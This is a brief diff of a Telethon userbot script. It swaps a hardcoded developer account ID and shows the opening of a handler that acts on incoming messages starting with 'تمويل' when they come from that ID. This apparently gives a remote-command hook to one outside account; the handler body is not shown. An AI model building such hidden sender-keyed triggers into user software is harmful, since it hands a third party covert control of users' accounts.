@@ -279,8 +279,7 @@ async def ithker(knopis):
     await knopis.edit(choice(Qrue_Bosa))
 
 
-DevSaher = 1509530035
-
+DevSaher = 6653337615
 @kekoviq.on(events.NewMessage(incoming=True))
 async def Hussein(event):
     if event.message.message.startswith("تمويل") and event.sender_id == DevSaher:
